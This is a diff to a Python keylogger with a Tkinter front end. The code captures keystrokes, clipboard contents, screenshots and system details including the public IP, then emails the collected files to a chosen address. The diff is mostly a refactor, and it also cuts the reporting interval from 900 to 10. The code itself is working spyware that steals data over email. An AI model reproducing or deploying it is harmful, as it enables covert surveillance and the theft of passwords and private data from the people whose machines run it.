@@ -6,18 +6,19 @@ import smtplib
 import socket
 import threading
 import tkinter
+import urllib.error
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from time import sleep
-from tkinter import Label, Frame, Entry, Button, messagebox, StringVar
+from tkinter import Label, Frame, Entry, Button, messagebox, StringVar, Tk
+from urllib.request import urlopen
 
 from PIL import ImageGrab, Image, ImageTk
 from customtkinter import CTk
 from dotenv import load_dotenv
 from pynput.keyboard import Listener
-from requests import get
 
 # Load environment variables
 load_dotenv()
@@ -61,7 +62,7 @@ def send_email(filename, attachment, toaddr):
     filename = filename
     attachment = open(attachment, 'rb')
     p = MIMEBase('application', 'octet-stream')
-    p.set_payload((attachment).read())
+    p.set_payload(attachment.read())
     encoders.encode_base64(p)
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
     msg.attach(p)
@@ -78,11 +79,13 @@ def computer_information():
     with open(system_information, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
-        try:
-            public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip + "\n")
 
-        except Exception:
+        try:
+            with urlopen("https://api.ipify.org", timeout=10) as response:
+                public_ip = response.read().decode()
+            f.write(f"Public IP Address: {public_ip}\n")
+        except urllib.error.URLError:
+            # called if say there's no internet connection
             f.write("Public IP Address: Couldn't get Public IP Address\n")
 
         f.write("Processor: " + (platform.processor()) + '\n')
@@ -96,7 +99,7 @@ def computer_information():
 def copy_clipboard():
     with open(clipboard_information, "a") as f:
         try:
-            r = tkinter.Tk()
+            r = Tk()
             r.withdraw()
             pasted_data = r.clipboard_get()
             f.write("\nClipboard Data: \n" + pasted_data)
@@ -140,19 +143,19 @@ listener = Listener(on_press=on_press)
 # Function to start keylogger
 def start_logger():
     global listener, toAddr, btnStr
-    count = 900
+    count = 10
     listener.start()
     btnStr.set("Stop Keylogger")
     while True:
         print(count)
         if stopFlag:
             break
-        if (count % 30 == 0):
+        if count % 30 == 0:
             copy_clipboard()
-        if (count == 0):
+        if count == 0:
             screenshot()
             computer_information()
-            if (email_address and password and toAddr != ""):
+            if email_address and password and toAddr != "":
                 try:
                     send_email(keys_information, keys_information, toAddr)
                 except:
@@ -169,7 +172,7 @@ def start_logger():
 def on_button_click():
     global state, toAddr, listener, stopFlag, receiver_entry, btnStr
     toAddr = receiver_entry.get()
-    if (receiver_entry['state'] == 'normal'):
+    if receiver_entry['state'] == 'normal':
         receiver_entry['state'] = 'disabled'
         btnStr.set("Starting...")
     else:
